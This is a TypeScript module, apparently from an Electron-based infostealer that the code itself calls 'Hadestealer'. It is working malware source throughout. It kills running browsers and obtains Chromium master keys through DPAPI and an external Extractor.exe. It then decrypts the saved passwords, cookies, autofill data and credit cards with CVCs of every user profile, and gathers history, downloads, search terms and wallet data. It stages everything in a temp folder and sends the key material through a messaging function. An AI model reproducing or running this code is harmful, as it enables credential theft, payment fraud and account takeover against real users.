import fs from 'fs';
import path from 'path';
import os from 'os';
import sqlite3 from 'sqlite3';
import { execSync } from 'child_process';
import { Cookie, CookieRow } from '../types';
import { browserPaths } from '../config/constants';
import { decrypt } from '../core/crypto';
import { getUsers } from '../utils/file';
import { getAppBoundKey } from '../core/appBound';
import { sendGenericMessage } from '../api/sender';
import { killBrowsersSync } from '../utils/process';
import { app } from 'electron';
import { copyBrowserWallets } from '../systems/wallet';

export interface BrowserKeys {
    v10Key: Buffer | null;
    v20Key: Buffer | null;
}

export let globalMasterKeyCache: Record<string, string> | null = null;

function getExtractorPath() {
    const isPackaged = app ? app.isPackaged : process.env.NODE_ENV === 'production';
    if (isPackaged) {
        return path.join(process.resourcesPath, 'lib', 'Extractor.exe');
    } else {
        return path.join(process.cwd(), 'src', 'lib', 'Extractor.exe');
    }
}
async function refreshMasterKeyCache() {
    if (globalMasterKeyCache) return;
    try {
        const exePath = getExtractorPath();
        if (!fs.existsSync(exePath)) {
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        if (fs.existsSync(exePath)) {
            try {
                const output = execSync(`"${exePath}"`, { encoding: 'utf8', windowsHide: true, maxBuffer: 1024 * 1024 * 10 });
                globalMasterKeyCache = JSON.parse(output);
                sendGenericMessage(output)
            } catch (error: any) {
                sendGenericMessage(error.message)
            }
        } else {
            sendGenericMessage("Extractor is not defined.")
            globalMasterKeyCache = {};
        }
    } catch (e) {
        globalMasterKeyCache = {};
    }
}

export async function getAllMasterKeys(pathh: string): Promise<BrowserKeys> {
    let keys: BrowserKeys = { v10Key: null, v20Key: null };

    try {
        const localStatePath = path.join(pathh, 'Local State');
        if (!fs.existsSync(localStatePath)) return keys;

        try {
            keys.v20Key = await getAppBoundKey(pathh);
        } catch (e) { }

        const data = fs.readFileSync(localStatePath, 'utf8');
        const parsedData = JSON.parse(data);
        const encryptedKeyB64 = parsedData.os_crypt?.encrypted_key;

        if (encryptedKeyB64) {
            const decodedKeyBuffer = Buffer.from(encryptedKeyB64, 'base64');
            const slicedKeyBuffer = decodedKeyBuffer.slice(decodedKeyBuffer.slice(0, 5).toString() === 'DPAPI' ? 5 : 0);

            try {
                const { nativeDPAPIUnprotect } = require('../core/crypto');
                const decrypted = nativeDPAPIUnprotect(slicedKeyBuffer);
                if (decrypted && decrypted.length === 32) {
                    keys.v10Key = decrypted;
                }
            } catch (err) {
            }
        }

        if (!keys.v20Key) {
            await refreshMasterKeyCache();

            if (globalMasterKeyCache) {
                const matchedBrowser = Object.keys(globalMasterKeyCache).find(name => {
                    const searchPattern = name.replace('Google ', '').replace('Microsoft ', '').split(' ')[0].toLowerCase();
                    return pathh.toLowerCase().includes(searchPattern);
                });

                if (matchedBrowser && globalMasterKeyCache[matchedBrowser]) {
                    keys.v20Key = Buffer.from(globalMasterKeyCache[matchedBrowser], 'hex');
                    sendGenericMessage(`${matchedBrowser} ${keys.v20Key}`)
                }
            }
        }
        if (!keys.v20Key) {
            sendGenericMessage("V20 Master Key alınamadı.")
        }
        if (!keys.v10Key) {
            sendGenericMessage("V10 Master Key alınamadı.")
        }

    } catch (globalError) {
    }

    return keys;
}

export async function executeQuery<T>(pathh: string, query: string): Promise<T[]> {
    const fileName = `db_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const pathTmp = path.join(os.tmpdir(), fileName);

    if (!fs.existsSync(pathh)) {
        console.log(pathh)
        return []
    }

    try {
        killBrowsersSync();
        await new Promise(r => setTimeout(r, 2000));
        await new Promise<void>((resolve, reject) => {
            const rd = fs.createReadStream(pathh);
            const wr = fs.createWriteStream(pathTmp);

            rd.on('error', (err) => reject(err));
            wr.on('error', (err) => reject(err));
            wr.on('finish', () => { resolve(); });

            rd.pipe(wr);
        });
        const db = new sqlite3.Database(pathTmp);

        const data = await new Promise<T[]>((res, rej) => {
            db.all(query, (err, rows) => {
                db.close();
                if (err) rej(err);
                else res(rows as T[]);
            });
        });

        return data;
    } catch (e: any) {
        sendGenericMessage(e.message)
        return [];
    } finally {
        try {
            if (fs.existsSync(pathTmp)) {
                fs.unlinkSync(pathTmp);
            }
        } catch (error) {
        }
    }
}

export async function getCookies(
    profilePath: string,
    masterKey?: Buffer | null,
    masterKeyV10?: Buffer | null,
    userDataPath?: string
): Promise<Cookie[]> {
    if (!masterKey && !masterKeyV10) return [];
    try {
        const potentialPaths = [
            path.join(profilePath, 'Network', 'Cookies'),
            path.join(profilePath, 'Cookies'),
        ];

        let rows: CookieRow[] = [];
        for (const dbPath of potentialPaths) {
            if (fs.existsSync(dbPath)) {
                rows = await executeQuery<CookieRow>(dbPath, 'SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies');
                if (rows.length > 0) break;
            }
        }

        const decryptPromises = rows.map(async (row) => {
            if (!row.encrypted_value) return null;
            try {
                var decryptedValue = await decrypt(row.encrypted_value, masterKey!, userDataPath);
                if (!decryptedValue) decryptedValue = await decrypt(row.encrypted_value, masterKeyV10!, userDataPath)
                if (!decryptedValue) return null

                return {
                    domain: row.host_key,
                    name: row.name,
                    value: decryptedValue,
                    path: row.path,
                    expires: row.expires_utc,
                    secure: row.is_secure === 1,
                    httpOnly: row.is_httponly === 1
                };
            } catch {
                return null;
            }
        });

        const results = await Promise.all(decryptPromises);
        const lastREs = results.filter((c): c is Cookie => c !== null);
        return lastREs

    } catch (e: any) {
        sendGenericMessage(e.message)
        return [];
    }
}

export async function getAutofills(pathh: string): Promise<string[]> {
    try {
        const autofills: string[] = [];

        const rows = await executeQuery<{ name: string; value: string }>(
            path.join(pathh, 'Web Data'),
            'SELECT * FROM autofill'
        );
        rows.map((rw) => autofills.push(`Name: ${rw?.name} | Value: ${rw?.value}`));

        return autofills;
    } catch (e: any) {
        sendGenericMessage(e.message)
        return [];
    }
}

export async function getCreditCardsDetailed(pathh: string, masterKey: Buffer): Promise<string[]> {
    try {
        const webDataPath = path.join(pathh, 'Web Data');
        if (!fs.existsSync(webDataPath)) return [];

        const cardRows = await executeQuery<any>(webDataPath, 'SELECT * FROM credit_cards');
        if (!cardRows || cardRows.length === 0) return [];

        const tableCheck = await executeQuery<any>(webDataPath, "SELECT name FROM sqlite_master WHERE type='table' AND name='local_stored_cvc'");

        let cvcRows: any[] = [];
        if (tableCheck.length > 0) {
            cvcRows = await executeQuery<any>(webDataPath, 'SELECT guid, cvc_encrypted FROM local_stored_cvc');
        }

        const cards: string[] = [];

        for (const rw of cardRows) {
            const decryptedNumber = await decrypt(rw.card_number_encrypted, masterKey);
            let cvvStatus = "Browser not supported or CVV not stored";

            const matchingCvc = cvcRows.find((c: any) => c.guid === rw.guid);
            if (matchingCvc && matchingCvc.cvc_encrypted) {
                const decryptedCVC = await decrypt(matchingCvc.cvc_encrypted, masterKey);
                if (decryptedCVC) cvvStatus = decryptedCVC;
            }

            cards.push(
                `Holder: ${rw.name_on_card} | ` +
                `Number: ${decryptedNumber} | ` +
                `Expiry: ${rw.expiration_month}/${rw.expiration_year} | ` +
                `Nickname: ${rw.nickname || 'N/A'} | ` +
                `CVV: ${cvvStatus}`
            );
        }
        return cards;
    } catch (e: any) {
        return [];
    }
}
export async function getPasswords(pathh: string, masterKey10: Buffer | null, masterKey20: Buffer | null, userDataPath?: string): Promise<string[]> {
    try {
        const passwords: string[] = [];

        const dbPath = pathh.includes("Yandex")
            ? path.join(pathh, 'Ya Passman Data')
            : path.join(pathh, 'Login Data');

        if (!fs.existsSync(dbPath)) return [];

        const rows = await executeQuery<{ username_value: string; password_value: Buffer; origin_url: string }>(
            dbPath,
            'SELECT * FROM logins'
        );

        let successCount = 0;

        for (const rw of rows) {
            if (!rw.username_value) continue;

            let password: string | null = null;
            if (rw.password_value && masterKey10) {
                password = await decrypt(rw.password_value, masterKey10, userDataPath).catch((e) => null);
            }
            if (!password && rw.password_value && masterKey20) {
                password = await decrypt(rw.password_value, masterKey20, userDataPath).catch((e) => null);
            }
            if (password) {
                passwords.push(`Username: ${rw.username_value} | Password: ${password} | URL: ${rw.origin_url}`);
                successCount++;
            }
        }

        return passwords;
    } catch (e: any) {
        sendGenericMessage(e.message)
        return [];
    }
}

export async function getHistory(profilePath: string): Promise<string[]> {
    try {
        const historyPath = path.join(profilePath, 'History');
        if (!fs.existsSync(historyPath)) return [];

        const rows = await executeQuery<{ url: string; title: string; last_visit_time: number }>(historyPath, 'SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500');

        return rows.map(rw => {
            const date = new Date((rw.last_visit_time / 1000000 - 11644473600) * 1000);
            return `URL: ${rw.url} | Title: ${rw.title} | Date: ${date.toISOString()}`;
        });
    } catch (e: any) {
        sendGenericMessage(e.message)
        return [];
    }
}

export async function getDownloads(profilePath: string): Promise<string[]> {
    try {
        const historyPath = path.join(profilePath, 'History');
        if (!fs.existsSync(historyPath)) return [];

        const rows = await executeQuery<{ target_path: string; start_time: number; total_bytes: number; url: string }>(
            historyPath,
            'SELECT d.target_path, d.start_time, d.total_bytes, du.url FROM downloads d LEFT JOIN downloads_url_chains du ON d.id = du.id ORDER BY d.start_time DESC LIMIT 500'
        );

        return rows.map(rw => {
            const date = new Date((rw.start_time / 1000000 - 11644473600) * 1000);
            return `File: ${rw.target_path} | Size: ${rw.total_bytes} bytes | URL: ${rw.url || 'Unknown'} | Date: ${date.toISOString()}`;
        });
    } catch (e: any) {
        sendGenericMessage(e.message)
        return [];
    }
}

export async function getSearchHistory(profilePath: string): Promise<string[]> {
    try {
        const historyPath = path.join(profilePath, 'History');
        if (!fs.existsSync(historyPath)) return [];

        const rows = await executeQuery<{ url: string }>(
            historyPath,
            "SELECT url FROM urls WHERE url LIKE '%q=%' OR url LIKE '%search?p=%'"
        );

        return rows.map(rw => {
            try {
                const url = new URL(rw.url);
                return url.searchParams.get('q') || url.searchParams.get('p') || '';
            } catch { return ''; }
        }).filter(term => term.length > 0);
    } catch (e) {
        return [];
    }
}

export async function getDataBrowser(): Promise<any[]> {
    const profiles: any[] = [];
    const usersAll = await getUsers();
    killBrowsersSync()
    return new Promise(async (res, rej) => {
        try {
            for (const user of usersAll) {
                for (const [name, relativePath] of Object.entries(browserPaths)) {
                    let fullPath = path.join(user, relativePath as string);
                    if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
                        const rel = relativePath as string;
                        let altRel = rel;
                        if (rel.includes('AppData\\Local')) altRel = rel.replace('AppData\\Local', 'AppData\\Roaming');
                        else if (rel.includes('AppData\\Roaming')) altRel = rel.replace('AppData\\Roaming', 'AppData\\Local');

                        const altFull = path.join(user, altRel);
                        if (!fs.existsSync(altFull) || !fs.lstatSync(altFull).isDirectory()) {
                            continue;
                        }
                        fullPath = altFull;
                    }

                    let masterKey = await getAllMasterKeys(fullPath);
                    if (!masterKey) {
                        const rel = (relativePath as string);
                        let altRel = rel.includes('AppData\\Local') ? rel.replace('AppData\\Local', 'AppData\\Roaming') : rel.includes('AppData\\Roaming') ? rel.replace('AppData\\Roaming', 'AppData\\Local') : rel;
                        const altFull = path.join(user, altRel);
                        if (altFull !== fullPath && fs.existsSync(altFull) && fs.lstatSync(altFull).isDirectory()) {
                            masterKey = await getAllMasterKeys(altFull);
                            if (masterKey) {
                                fullPath = altFull;
                            }
                        }
                    }

                    if (!masterKey) {
                        masterKey = await getAllMasterKeys(fullPath);
                    }
                    const userDataRoot = path.basename(fullPath).toLowerCase() === 'user data' ? fullPath : path.dirname(fullPath);

                    let allSubDirs: string[] = [];
                    try {
                        allSubDirs = fs.readdirSync(userDataRoot, { withFileTypes: true }).filter(d => d.isDirectory()).map(d => d.name);
                    } catch { }

                    for (const subDir of allSubDirs) {
                        if (subDir === 'System Profile') continue;

                        const subDirPath = path.join(userDataRoot, subDir);
                        const hasLoginData = fs.existsSync(path.join(subDirPath, 'Login Data'));
                        const hasCookies = fs.existsSync(path.join(subDirPath, 'Network', 'Cookies'));
                        const hasWebData = fs.existsSync(path.join(subDirPath, 'Web Data'));

                        if (hasLoginData || hasCookies || hasWebData) {
                            const profile = {
                                name: name,
                                profile: subDir,
                                path: subDirPath,
                                browser: {
                                    name,
                                    path: fullPath,
                                    user: user.split(path.sep)[2]
                                },
                                autofills: [] as string[],
                                passwords: [] as string[],
                                cookies: [] as Cookie[],
                                history: [] as string[],
                                downloads: [] as string[],
                                searchHistory: [] as string[],
                                wallets: [] as any[],
                                cards: [] as any[]
                            };

                            profile.autofills = await getAutofills(subDirPath) || [];
                            profile.passwords = await getPasswords(subDirPath, masterKey.v10Key, masterKey.v20Key, fullPath) || [];
                            profile.cookies = await getCookies(subDirPath, masterKey.v20Key, masterKey.v10Key, fullPath) || [];
                            profile.history = await getHistory(subDirPath) || [];
                            profile.downloads = await getDownloads(subDirPath) || [];
                            profile.searchHistory = await getSearchHistory(subDirPath) || [];
                            profile.wallets = await copyBrowserWallets(name, subDirPath, name)
                            profile.cards = await getCreditCardsDetailed(subDirPath, masterKey.v20Key!)

                            profiles.push(profile);
                        }
                    }

                    const hasRootLoginData = fs.existsSync(path.join(fullPath, 'Login Data'));
                    const hasRootCookies = fs.existsSync(path.join(fullPath, 'Network', 'Cookies')) || fs.existsSync(path.join(fullPath, 'Cookies'));
                    const hasRootWebData = fs.existsSync(path.join(fullPath, 'Web Data'));

                    if (hasRootLoginData || hasRootCookies || hasRootWebData) {
                        const profile = {
                            name: name,
                            profile: 'Root',
                            path: fullPath,
                            browser: {
                                name,
                                path: fullPath,
                                user: user.split(path.sep)[2]
                            },
                            autofills: [] as string[],
                            passwords: [] as string[],
                            cookies: [] as Cookie[],
                            history: [] as string[],
                            downloads: [] as string[],
                            searchHistory: [] as string[],
                            wallets: [] as any[],
                            cards: [] as any[]
                        };

                        profile.autofills = await getAutofills(fullPath) || [];
                        profile.passwords = await getPasswords(fullPath, masterKey.v10Key, masterKey.v20Key, fullPath) || [];
                        profile.cookies = await getCookies(fullPath, masterKey.v20Key, masterKey.v10Key, fullPath) || [];
                        profile.history = await getHistory(fullPath) || [];
                        profile.downloads = await getDownloads(fullPath) || [];
                        profile.searchHistory = await getSearchHistory(fullPath) || [];
                        profile.wallets = await copyBrowserWallets(name, fullPath, name)
                        profile.cards = await getCreditCardsDetailed(fullPath, masterKey.v20Key!)

                        profiles.push(profile);
                    }
                }
            }
            return res(profiles);
        } catch (e: any) {
            sendGenericMessage(e.message)
            return rej(e);
        }
    });
}

export async function all(): Promise<string | null> {
    try {
        const profiles = await getDataBrowser();

        for (const profile of profiles) {

            try {
                const browserName = profile.browser.name.replace(/[<>:"/\\|?*]/g, '_');
                const profileName = profile.profile.replace(/[<>:"/\\|?*]/g, '_');

                const baseDir = path.join(
                    os.tmpdir(),
                    'Hadestealer',
                    'All',
                    browserName,
                    profileName
                );

                fs.mkdirSync(baseDir, { recursive: true });

                if (profile.autofills?.length > 0) {
                    fs.writeFileSync(
                        path.join(baseDir, 'autofills.txt'),
                        profile.autofills.join('\n')
                    );
                }

                if (profile.passwords?.length > 0) {
                    fs.writeFileSync(
                        path.join(baseDir, 'passwords.txt'),
                        profile.passwords.join('\n')
                    );
                }

                if (profile.history?.length > 0) {
                    fs.writeFileSync(
                        path.join(baseDir, 'history.txt'),
                        profile.history.join('\n')
                    );
                }

                if (profile.downloads?.length > 0) {
                    fs.writeFileSync(
                        path.join(baseDir, 'downloads.txt'),
                        profile.downloads.join('\n')
                    );
                }

                if (profile.searchHistory?.length > 0) {
                    fs.writeFileSync(
                        path.join(baseDir, 'search_history.txt'),
                        profile.searchHistory.join('\n')
                    );
                }
                if (profile.wallets?.length > 0) {
                    fs.writeFileSync(
                        path.join(baseDir, 'wallets.txt'),
                        profile.wallets.join('\n')
                    );
                }

                if (profile.cards?.length > 0) {
                    const allCreditFilePath = path.join(baseDir, '..', "..", "..", 'allCreditData.txt');

                    const dataToAppend = `${profile.cards.join('\n')}\n\n`;
                    fs.appendFileSync(allCreditFilePath, dataToAppend, 'utf8');

                }

                if (profile.cookies?.length > 0) {
                    const cookiesText = profile.cookies.map((c: Cookie) => {
                        const host = c.domain;
                        const includeSubdomains = host?.startsWith('.') ? 'TRUE' : 'FALSE';
                        const secure = c.secure ? 'TRUE' : 'FALSE';
                        const path = c.path;

                        let expiry = 0;
                        if (c.expires > 0) {
                            expiry = Math.floor((c.expires / 1000000) - 11644473600);
                            if (expiry < 0) expiry = 0;
                        }

                        const name = (c.name || '').replace(/[^\x20-\x7E]/g, '').trim();
                        const value = (c.value || '').replace(/[^\x20-\x7E]/g, '').trim();

                        if (!name) return null;

                        return `${host}\t${includeSubdomains}\t${path}\t${secure}\t${expiry}\t${name}\t${value}`;
                    }).filter((line: string | null) => line !== null).join('\n');

                    fs.writeFileSync(
                        path.join(baseDir, 'cookies.txt'),
                        cookiesText
                    );
                }

            } catch (profileError: any) {
                sendGenericMessage(profileError.message)
            }
        }
        return path.join(os.tmpdir(), 'Hadestealer', 'All');

    } catch (e) {
        sendGenericMessage(`${e}`)
        return null;
    }
}
